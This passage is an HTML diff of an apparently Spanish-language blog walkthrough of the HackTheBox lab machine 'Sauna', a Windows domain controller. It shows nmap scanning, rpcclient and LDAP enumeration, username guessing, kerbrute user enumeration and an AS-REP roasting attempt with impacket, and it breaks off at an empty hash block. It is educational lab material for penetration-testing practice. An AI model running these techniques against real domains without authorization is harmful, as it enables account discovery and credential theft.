@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Sauna Walkthrough - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/sauna/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Sauna Walkthrough">
+  <meta property="og:description" content="Sauna Escaneo y Enumeración Una vez conectado con la VPN y encendido la maquina en hackthebox inicio la fase de escaneo y enumeración lanzando la herramienta nmap realizando un escaneo de puertos para obtener servicios y versiones de los puertos abiertos.
+Iniciamos la maquina lanzando un escaneo de puertos con nmap.
+nmap -T4 -p- -A 10.10.10.175 Output:">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-11-08T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="AD">
+    <meta property="og:image" content="http://localhost:1313/sauna/preimagen.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/sauna/preimagen.png">
+  <meta name="twitter:title" content="Sauna Walkthrough">
+  <meta name="twitter:description" content="Sauna Escaneo y Enumeración Una vez conectado con la VPN y encendido la maquina en hackthebox inicio la fase de escaneo y enumeración lanzando la herramienta nmap realizando un escaneo de puertos para obtener servicios y versiones de los puertos abiertos.
+Iniciamos la maquina lanzando un escaneo de puertos con nmap.
+nmap -T4 -p- -A 10.10.10.175 Output:">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/sauna/" /><link rel="prev" href="http://localhost:1313/dc-9/" /><link rel="next" href="http://localhost:1313/crane/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Sauna Walkthrough",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/sauna\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/sauna\/preimagen.png",
+                            "width":  313 ,
+                            "height":  157 
+                        }],"genre": "posts","keywords": "Walkthrough, HackTheBox, TjNull, OSCP, Easy, AD, Active directory","wordcount":  1054 ,
+        "url": "http:\/\/localhost:1313\/sauna\/","datePublished": "2023-11-08T00:00:00+00:00","dateModified": "2023-11-08T11:24:09+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="AntuSec"><span class="header-title-pre"><i class='far fa-kiss-wink-heart' aria-hidden='true'></i></span>AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Publicaciones </a><a class="menu-item" href="/tags/"> Etiquetas </a><a class="menu-item" href="/categories/"> Categorias </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/en/sauna/">English</option><option value="/sauna/" selected>Español</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="AntuSec"><span class="header-title-pre"><i class='far fa-kiss-wink-heart' aria-hidden='true'></i></span>AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Publicaciones</a><a class="menu-item" href="/tags/" title="">Etiquetas</a><a class="menu-item" href="/categories/" title="">Categorias</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/en/sauna/">English</option><option value="/sauna/" selected>Español</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sauna Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">incluido en <a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>HacktheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-11-08">2023-11-08</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1054 palabras&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;5 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/preimagen.png"
+        data-srcset="/sauna/preimagen.png, /sauna/preimagen.png 1.5x, /sauna/preimagen.png 2x"
+        data-sizes="auto"
+        alt="/sauna/preimagen.png"
+        title="/sauna/preimagen.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#escaneo-y-enumeración">Escaneo y Enumeración</a></li>
+    <li><a href="#explotación">Explotación</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sauna">Sauna</h1>
+<h2 id="escaneo-y-enumeración">Escaneo y Enumeración</h2>
+<p>Una vez conectado con la VPN y encendido la maquina en hackthebox inicio la fase de escaneo y enumeración lanzando la herramienta nmap realizando un escaneo de puertos para obtener servicios y versiones de los puertos abiertos.</p>
+<p>Iniciamos la maquina lanzando un escaneo de puertos con nmap.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap  -T4 -p- -A  10.10.10.175</span></span></code></pre></div></div>
+<p>Output:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-05 13:43 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:01 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:09 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 0.13% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:16 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 1.62% <span class="k">done</span><span class="p">;</span> ETC: 13:53 <span class="o">(</span>0:10:07 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:18 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 2.25% <span class="k">done</span><span class="p">;</span> ETC: 13:52 <span class="o">(</span>0:08:41 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:19 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 2.61% <span class="k">done</span><span class="p">;</span> ETC: 13:51 <span class="o">(</span>0:08:04 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:02:19 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Service Scan
+</span></span><span class="line"><span class="cl">Service scan Timing: About 75.00% <span class="k">done</span><span class="p">;</span> ETC: 13:45 <span class="o">(</span>0:00:13 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:03:07 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.96% <span class="k">done</span><span class="p">;</span> ETC: 13:46 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.175
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.040s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65515</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Egotistical Bank :: Home
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2023-11-06 01:45:04Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49689/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49696/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows <span class="m">2019</span> <span class="o">(</span>89%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Microsoft Windows Server <span class="m">2019</span> <span class="o">(</span>89%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-11-06T01:46:05
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 7h00m00s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TRACEROUTE <span class="o">(</span>using port 139/tcp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HOP RTT      ADDRESS
+</span></span><span class="line"><span class="cl"><span class="m">1</span>   40.04 ms 10.10.14.1
+</span></span><span class="line"><span class="cl"><span class="m">2</span>   40.24 ms 10.10.10.175
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 206.70 seconds</span></span></code></pre></div></div>
+<p>Observando el resultado, veo que se trata de un controlador de dominio y que el dominio es EGOTISTICAL-BANK.LOCAL y lo primero que se me ocurre es como obtener usuarios validos del controlador del dominio.</p>
+<p>Primero lanzo la herramienta rpcclient para ver si puedo obtener usuarios pero no tengo éxito ya que no esta habilitado la null sesion (acceso sin credenciales).</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient -U <span class="s1">&#39;&#39;</span> 10.10.10.175 -c <span class="s1">&#39;enumdomusers&#39;</span></span></span></code></pre></div></div>
+<p>Después paso a realizar una enumeración del servicio ldap en busca de usuarios.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Obtengo el dominio</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ldapsearch -H ldap://10.10.10.175 -x -b <span class="s2">&#34;DC=EGOTISTICAL-BANK,DC=local&#34;</span></span></span></code></pre></div></div>
+<p>Buscando en la salida de la herramienta veo el nombre de Hugo Smith</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png"
+        title="Untitled" width="417" height="111" /></p>
+<p>Normalmente los nombres de usuarios en un controlador de domino se forman con la primera letra del nombre seguido del apellido.</p>
+<p>Sabiendo esto creo una lista con posibles nombres.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hugosmith
+</span></span><span class="line"><span class="cl">h.smith
+</span></span><span class="line"><span class="cl">hugo.smith
+</span></span><span class="line"><span class="cl">hsmith</span></span></code></pre></div></div>
+<p>Al estar el puerto 88 de kerberos abierto hago uso de la herramienta kerbrute para validar usuarios.</p>
+<p>Enlace de herramienta:<a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener noreffer ">https://github.com/ropnop/kerbrute</a></p>
+<p>Instalacion:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/ropnop/kerbrute.git
+</span></span><span class="line"><span class="cl"><span class="c1">#Dentro del directorio creado</span>
+</span></span><span class="line"><span class="cl">go build -ldflags <span class="s2">&#34;-s -w&#34;</span> .
+</span></span><span class="line"><span class="cl">upx kerbrute</span></span></code></pre></div></div>
+<p>Lanzo la herramienta con el fichero de posibles nombres.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png"
+        title="Untitled" width="698" height="280" /></p>
+<p>Obtengo que el usuario hsmith es valido por lo que valido pruebo a realizar un ASREProast attack en busca de algun hash pero no tengo exito</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/impacket/examples/GetNPUsers.py  EGOTISTICAL-BANK.local/hsmith -no-pass -dc-ip 10.10.10.175</span></span></code></pre></div></div>
+<p>Me dirigo a buscar en la web en busca de mas usuarios y encuentro los siguientes</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png"
+        title="Untitled" width="904" height="817" /></p>
+<p>Como ya sabemos el formato de los nombres del usuario creo una lista con los nuevos usuarios.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hsmith
+</span></span><span class="line"><span class="cl">fsmith
+</span></span><span class="line"><span class="cl">scoins
+</span></span><span class="line"><span class="cl">hbear
+</span></span><span class="line"><span class="cl">btaylor
+</span></span><span class="line"><span class="cl">sdriver
+</span></span><span class="line"><span class="cl">skerb</span></span></code></pre></div></div>
+<h2 id="explotación">Explotación</h2>
+<p>Lanzo de nuevo la herramienta kerbrute con la nueva lista</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png"
+        title="Untitled" width="661" height="379" /></p>
+<p>Y obtenemos un hash</p>
+<p>Hash:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
